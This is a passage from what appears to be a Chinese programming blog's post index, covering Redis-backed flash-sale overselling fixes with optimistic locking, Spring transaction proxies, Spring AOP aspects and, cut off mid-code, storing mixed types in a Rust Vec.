&#123;</span><br><span class="line">        <span class="comment">// 扣减库存失败</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;库存不足!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 创建订单</span></span><br><span class="line">    <span class="type">VoucherOrder</span> <span class="variable">voucherOrder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VoucherOrder</span>();</span><br><span class="line">    <span class="comment">// 7.1 订单id</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">orderId</span> <span class="operator">=</span> redisIdWorker.nextId(<span class="string">&quot;order&quot;</span>);</span><br><span class="line">    voucherOrder.setId(orderId);</span><br><span class="line">    <span class="comment">// 7.2 用户id</span></span><br><span class="line">    voucherOrder.setUserId(userId);</span><br><span class="line">    <span class="comment">// 7.3 代金券id</span></span><br><span class="line">    voucherOrder.setVoucherId(voucherId);</span><br><span class="line">    save(voucherOrder);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 返回订单id</span></span><br><span class="line">    <span class="keyword">return</span> Result.ok(orderId);</span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，使用sync锁定用户id，但是不能放在方法上，因为会导致串行化，性能下降。</p>
<p>并且，userId要使用intern来保证锁的唯一性，intern会在常量池中查找是否存在该对象，如果存在则返回常量池中的对象，如果不存在则放入常量池并返回。如果不使用intern，那么每次都会创建新的对象，导致锁失效。</p>
<p>同时，方法使用@Transactional注解，保证事务的一致性。</p>
<p>由于spring通过代理模式来实现事务，如果直接调用this.func，那么就不会走代理，导致事务失效，所以这里使用代理对象来调用createVoucherOrder方法。</p>
<p>如何获取代理对象呢？通过AopContext.currentProxy()来获取代理对象。</p>
<p>注意添加注解让代理对象暴露出来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableAspectJAutoProxy(exposeProxy = true)</span></span><br></pre></td></tr></table></figure>

<p>同时别忘了修改pom.xml：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>进行jmeter压测，发现并发问题得到解决，用户只能购买一次商品。</p>
<p><img src="/images/image20.png" alt="alt text"></p>
<p>数据库显示：</p>
<p><img src="/images/image21.png" alt="alt text"></p>
<p>显示成功，用户只能购买一次商品。</p>
]]></content>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>超卖问题</title>
    <url>/2025/03/18/%E8%B6%85%E5%8D%96%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="什么是超卖"><a href="#什么是超卖" class="headerlink" title="什么是超卖"></a>什么是超卖</h2><p>超卖是指卖出的商品数量超过了实际库存数量，这种情况通常发生在高并发的电商网站上，比如双十一、618等大促销活动。超卖的原因主要是多线程并发操作数据库时，没有对库存数量进行加锁，导致多个线程同时读取库存数量，然后都判断库存数量足够，最后都执行了减库存操作，导致库存数量变为负数。</p>
<h2 id="如何解决超卖问题"><a href="#如何解决超卖问题" class="headerlink" title="如何解决超卖问题"></a>如何解决超卖问题</h2><p>加锁是解决超卖问题的常用方法</p>
<h3 id="锁的种类"><a href="#锁的种类" class="headerlink" title="锁的种类"></a>锁的种类</h3><ul>
<li><p><strong>悲观锁</strong>：悲观锁认为线程安全问题一定会发生，所以在操作数据之前先加锁，操作完成后再释放锁。串行化处理，效率低。</p>
</li>
<li><p><strong>乐观锁</strong>：乐观锁认为线程安全问题不一定会发生，所以在操作数据之前不加锁，只是在更新数据时判断数据是否被其他线程修改过，如果没有修改过则更新成功，否则更新失败。</p>
</li>
</ul>
<p>对于超卖问题，乐观锁更适合，因为超卖问题不是一定会发生的，只有在多个线程同时读取库存数量时才会发生，所以只需要在更新库存数量时判断库存数量是否足够即可。</p>
<h3 id="乐观锁的实现方式"><a href="#乐观锁的实现方式" class="headerlink" title="乐观锁的实现方式"></a>乐观锁的实现方式</h3><p>关键在于判断数据是否被其他线程修改过，一般有两种方式：</p>
<p><img src="/images/image18.png" alt="alt text"></p>
<ul>
<li><strong>版本号</strong>：给数据表增加一个版本号字段，每次更新数据时将版本号加1，更新数据时判断版本号是否一致，如果一致则更新成功，否则更新失败。</li>
</ul>
<p><img src="/images/image19.png" alt="alt text"></p>
<ul>
<li><strong>CAS（Compare And Swap）</strong>：使用CAS指令更新数据，CAS指令是一种原子操作，可以保证数据的一致性。每次更新数据时，先读取数据的值，然后比较数据的值是否和预期值一致，如果一致则更新数据，否则更新失败。</li>
</ul>
<p>注意，如果单纯使用CAS指令更新数据，可能会导致ABA问题，即数据的值被修改两次，但是版本号没有变化，所以需要使用版本号来解决ABA问题。</p>
<h4 id="ABA问题"><a href="#ABA问题" class="headerlink" title="ABA问题"></a>ABA问题</h4><p>如果库存值从A变成B再变成A，那么CAS操作会认为库存值没有变化，但实际上库存值已经发生了变化，这就是ABA问题。</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>这里单纯使用CAS指令更新数据，不考虑ABA问题。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">seckillVoucher</span><span class="params">(Long voucherId)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 查询代金券库存</span></span><br><span class="line">    <span class="type">SeckillVoucher</span> <span class="variable">voucher</span> <span class="operator">=</span> seckillVoucherService.getById(voucherId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 判断秒杀是否开始</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getBeginTime().isAfter(LocalDateTime.now())) &#123;</span><br><span class="line">        <span class="comment">// 秒杀未开始</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;秒杀未开始&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 判断秒杀是否结束</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getEndTime().isBefore(LocalDateTime.now())) &#123;</span><br><span class="line">        <span class="comment">// 秒杀已结束</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;秒杀已结束&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 判断库存是否足够</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getStock() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 库存不足</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;库存不足&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 扣减库存(CAS)</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> seckillVoucherService.update()</span><br><span class="line">            .setSql(<span class="string">&quot;stock = stock - 1&quot;</span>) <span class="comment">// set stock = stock - 1</span></span><br><span class="line">            .eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId) <span class="comment">// where voucher_id = #&#123;voucherId&#125;</span></span><br><span class="line">            .gt(<span class="string">&quot;stock&quot;</span>, <span class="number">0</span>) <span class="comment">// and stock &gt; 0</span></span><br><span class="line"><span class="comment">//                .eq(&quot;stock&quot;, voucher.getStock()) // where stock = #&#123;stock&#125;</span></span><br><span class="line">            .update(); <span class="comment">// 数据库锁 不会存在都为1然后都修改的情况</span></span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        <span class="comment">// 扣减库存失败</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;库存不足!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 创建订单</span></span><br><span class="line">    <span class="type">VoucherOrder</span> <span class="variable">voucherOrder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VoucherOrder</span>();</span><br><span class="line">    <span class="comment">// 6.1 订单id</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">orderId</span> <span class="operator">=</span> redisIdWorker.nextId(<span class="string">&quot;order&quot;</span>);</span><br><span class="line">    voucherOrder.setId(orderId);</span><br><span class="line">    <span class="comment">// 6.2 用户id</span></span><br><span class="line">    <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> UserHolder.getUser().getId();</span><br><span class="line">    voucherOrder.setUserId(userId);</span><br><span class="line">    <span class="comment">// 6.3 代金券id</span></span><br><span class="line">    voucherOrder.setVoucherId(voucherId);</span><br><span class="line">    save(voucherOrder);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 返回订单id</span></span><br><span class="line">    <span class="keyword">return</span> Result.ok(orderId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，如果条件判断是要库存和之前的库存相等，这样会导致<strong>成功率低</strong>，未卖出问题，即当100个请求进入时，其中一个请求先执行完修改了库存，剩余99个因为这个条件判断失败都不会执行，这样就会导致未卖出问题。</p>
<p>所以这里使用了<code>gt(&quot;stock&quot;, 0)</code>，即库存大于0时才执行扣减库存操作。保证了实现卖完即止。</p>
<p>注意，为什么不会存在库存为1，然后都修改的情况，因为这里的update是<strong>Mysql</strong>提供锁来进行隔离，不会存在都为1然后都修改的情况。</p>
<h3 id="可优化方向"><a href="#可优化方向" class="headerlink" title="可优化方向"></a>可优化方向</h3><ul>
<li><strong>数据库锁</strong>：使用数据库锁来保证数据的一致性，比如行锁、表锁、读锁、写锁等。</li>
<li><strong>缓存</strong>：将库存数量缓存到Redis中，减少数据库的访问次数。</li>
<li><strong>消息队列</strong>：使用消息队列来异步处理订单，减少数据库的压力。<br>…</li>
</ul>
]]></content>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>aop</title>
    <url>/2025/03/19/aop/</url>
    <content><![CDATA[<h2 id="什么是AOP"><a href="#什么是AOP" class="headerlink" title="什么是AOP"></a>什么是AOP</h2><p>AOP（Aspect Oriented Programming），面向切面编程，是一种编程范式，是OOP（Object Oriented Programming）的补充。OOP是面向对象编程，AOP是面向切面编程。</p>
<p>AOP的核心思想是将程序的业务逻辑和系统级服务分开，通过切面将系统级服务应用到业务逻辑中，从而实现业务逻辑和系统级服务的解耦。</p>
<h2 id="AOP的核心概念"><a href="#AOP的核心概念" class="headerlink" title="AOP的核心概念"></a>AOP的核心概念</h2><ol>
<li>连接点（JoinPoint）：可以被AOP控制的方法</li>
<li>通知（Advice）：指哪些重复的逻辑，也就是共性功能</li>
<li>切入点（PointCut）：匹配连接点的条件，通知仅会在切入点方法被执行时应用</li>
<li>切面（Aspect）：通知和切入点的组合</li>
<li>目标对象（Target）：被代理的对象</li>
</ol>
<h2 id="AOP的实现"><a href="#AOP的实现" class="headerlink" title="AOP的实现"></a>AOP的实现</h2><p>动态代理是AOP最主流的实现方式，Spring AOP就是基于动态代理实现的。在管理bean对象的时候，Spring会为bean对象创建一个代理对象，当调用代理对象的方法时，会先调用代理对象的增强方法，再调用目标对象的方法。</p>
<h2 id="AOP的应用场景"><a href="#AOP的应用场景" class="headerlink" title="AOP的应用场景"></a>AOP的应用场景</h2><ol>
<li>日志记录</li>
<li>权限控制</li>
<li>事务管理<br>…</li>
</ol>
<p>例如，进行记录方法运行时间时，可以通过AOP实现，而不需要在每个方法中都写一段记录时间的代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TimeAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Around(&quot;execution(* com.example.demo.service.*.*(..))&quot;)</span> <span class="comment">// 切入点</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">time</span><span class="params">(ProceedingJoinPoint joinPoint)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> joinPoint.proceed();</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;方法&#123;&#125;运行时间为&#123;&#125;ms&quot;</span>, joinPoint.getSignature().getName(), end - start);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上面的代码中，通过@Aspect注解声明一个切面，通过@Around注解声明一个环绕通知，通过execution表达式指定切入点，即需要增强的方法，通过ProceedingJoinPoint对象获取方法的信息，通过proceed方法调用目标方法，最后记录方法的运行时间。</p>
<h2 id="AOP的优点"><a href="#AOP的优点" class="headerlink" title="AOP的优点"></a>AOP的优点</h2><ol>
<li>代码无侵入性，不需要修改原有代码</li>
<li>代码复用性，将公共代码抽取出来，可以在多个方法中复用</li>
<li>代码解耦，将系统级服务和业务逻辑分开，提高代码的可维护性</li>
</ol>
<h2 id="深入学习"><a href="#深入学习" class="headerlink" title="深入学习"></a>深入学习</h2><h3 id="通知类型"><a href="#通知类型" class="headerlink" title="通知类型"></a>通知类型</h3><ol>
<li>前置通知（Before）：在目标方法执行前执行</li>
<li>后置通知（After）：在目标方法执行后执行，无论目标方法是否抛出异常</li>
<li>环绕通知（Around）：在目标方法执行前后执行</li>
<li>异常通知（AfterThrowing）：在目标方法抛出异常后执行</li>
<li>返回通知（AfterReturning）：在目标方法返回结果时执行，有异常时不执行</li>
</ol>
<p>注意，@Around通知需要调用proceed方法，才能执行目标方法，否则目标方法不会执行。同时，proceed的返回值应该为Object类型，否则会报错。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* com.example.demo.service.*.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pointCut</span><span class="params">()</span> &#123;&#125; <span class="comment">// 使用@Pointcut注解定义切入点</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before(&quot;pointCut()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;before&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After(&quot;pointCut()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;after&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Around(&quot;pointCut()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint joinPoint)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        log.info(<span class="string">&quot;around before&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> joinPoint.proceed();</span><br><span class="line">        log.info(<span class="string">&quot;around after&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterThrowing(&quot;pointCut()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterThrowing</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;afterThrowing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterReturning(&quot;pointCut()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterReturning</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;afterReturning&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="通知顺序"><a href="#通知顺序" class="headerlink" title="通知顺序"></a>通知顺序</h3><p>当有多个切面的切入点都匹配到了目标方法时，多个切面都会执行</p>
<h4 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h4><ol>
<li>不同切面类中，默认按照切面类的类名的字典顺序执行<ul>
<li>目标方法前：字母靠前的切面类先执行</li>
<li>目标方法后：字母靠后的切面类先执行</li>
</ul>
</li>
<li>用@Order注解指定切面的执行顺序<ul>
<li>目标方法前：数字小的切面类先执行</li>
<li>目标方法后：数字大的切面类先执行</li>
</ul>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Order(1)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* com.example.demo.service.*.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pointCut</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before(&quot;pointCut()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;before1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After(&quot;pointCut()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;after1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="切入点表达式"><a href="#切入点表达式" class="headerlink" title="切入点表达式"></a>切入点表达式</h3><p>两种常用的切入点表达式</p>
<h4 id="execution表达式"><a href="#execution表达式" class="headerlink" title="execution表达式"></a>execution表达式</h4><p>execution表达式用于匹配方法的执行，语法为<code>execution(访问修饰符? 返回值 包名.类名.?方法名(参数类型) throws 异常类型?)</code></p>
<p>可以使用通配符描述切入点</p>
<ul>
<li><code>*</code>：单个独立的任意符号，可以通配任意返回值、包名、类名、方法名、任意类型的一个参数，也可以通配包、类、方法名的一部分</li>
</ul>
<p><code>execution(* com.*.service*(*))</code>：匹配com包下的所有service开头的方法，且只有一个参数</p>
<ul>
<li><code>..</code>：多个连续的任意符号，可以通配任意层级的包，或任意类型、任意个数的参数</li>
</ul>
<p><code>execution(* com.example..DeptService.*(..))</code>：匹配com.example包及其子包下的DeptService类的所有方法</p>
<h4 id="annotation表达式"><a href="#annotation表达式" class="headerlink" title="annotation表达式"></a>annotation表达式</h4><p>annotation表达式用于匹配带有指定注解的方法，语法为<code>@annotation(注解类型)</code></p>
<p>自定义注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(ElementType.METHOD)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyAnnotation &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用自定义注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Pointcut(&quot;@annotation(com.example.demo.annotation.MyAnnotation)&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pointCut</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before(&quot;pointCut()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;before&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，只有带有@MyAnnotation注解的方法才会被增强</p>
<h3 id="连接点"><a href="#连接点" class="headerlink" title="连接点"></a>连接点</h3><p>在spring中用JoinPoint抽象了连接点，可以通过JoinPoint获取方法的信息</p>
<p>对于@Around通知，可以通过ProceedingJoinPoint调用proceed方法执行目标方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* com.example.demo.service.*.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pointCut</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Around(&quot;pointCut()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint joinPoint)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        log.info(<span class="string">&quot;around before&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> joinPoint.proceed();</span><br><span class="line">        log.info(<span class="string">&quot;around after&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于其他通知，可以通过JoinPoint获取方法的信息，JointPoint是ProceedingJoinPoint的父类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* com.example.demo.service.*.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pointCut</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before(&quot;pointCut()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;before&quot;</span>);</span><br><span class="line">        log.info(<span class="string">&quot;方法名：&#123;&#125;&quot;</span>, joinPoint.getSignature().getName());</span><br><span class="line">        log.info(<span class="string">&quot;参数：&#123;&#125;&quot;</span>, joinPoint.getArgs());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* com.example.demo.service.*.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pointCut</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Around(&quot;pointCut()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint joinPoint)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 获取类名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> joinPoint.getTarget().getClass().getName();</span><br><span class="line">        log.info(<span class="string">&quot;类名：&#123;&#125;&quot;</span>, className);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取方法名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> joinPoint.getSignature().getName();</span><br><span class="line">        log.info(<span class="string">&quot;方法名：&#123;&#125;&quot;</span>, methodName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取参数</span></span><br><span class="line">        Object[] args = joinPoint.getArgs();</span><br><span class="line">        log.info(<span class="string">&quot;参数：&#123;&#125;&quot;</span>, args);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 运行 获取返回值</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> joinPoint.proceed();</span><br><span class="line">        log.info(<span class="string">&quot;返回值：&#123;&#125;&quot;</span>, result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>spring boot</tag>
      </tags>
  </entry>
  <entry>
    <title>rust-Vec存储不同数据类型的几种方法</title>
    <url>/2025/03/21/rust-Vec%E5%AD%98%E5%82%A8%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="Vec简述"><a href="#Vec简述" class="headerlink" title="Vec简述"></a>Vec简述</h2><p>在 Rust 中，由于其静态类型系统的限制，Vec 默认只能存储相同类型的数据 。但如果你需要存储不同数据类型，可以通过以下方法实现</p>
<h2 id="使用枚举"><a href="#使用枚举" class="headerlink" title="使用枚举"></a>使用枚举</h2><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Value</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Int</span>(<span class="type">i32</span>),</span><br><span class="line">    <span class="title function_ invoke__">Float</span>(<span class="type">f64</span>),</span><br><span class="line">    <span class="title function_ invoke__">Text</span>(<span class="type">String</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">row</span> = <span class="built_in">vec!</span>[</span><br><span class="line">        Value::<span class="title function_ invoke__">Int</span>(<span class="number">3</span>),</span><br><span class="line">        Value::<span class="title function_ invoke__">Text</span>(<span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;blue&quot;</span>)),</span><br><span class="line">        Value::<span class="title function_ invoke__">Float</span>(<span class="number">10.12</span>),</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="使用特征对象"><a href="#使用特征对象" class="headerlink" title="使用特征对象"></a>使用特征对象</h2><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">trait</span> <span class="title class_">Draw</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">draw</span>(&amp;<span class="keyword">self</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Screen</span> &#123;</span><br><span class="line">    components: <span class="type">Vec</span>&lt;<span class="type">Box</span>&lt;<span class="keyword">dyn</span> Draw&gt;&gt;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Screen</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">run</span>(&amp;<span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> <span class="variable">component</span> <span class="keyword">in</span> <span class="keyword">self</span>.components.<span class="title function_ invoke__">iter</span>() &#123;</span><br><span class="line">            component.<span class="title function_ invoke__">draw</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Button</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">    label: <span class="type">String</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title 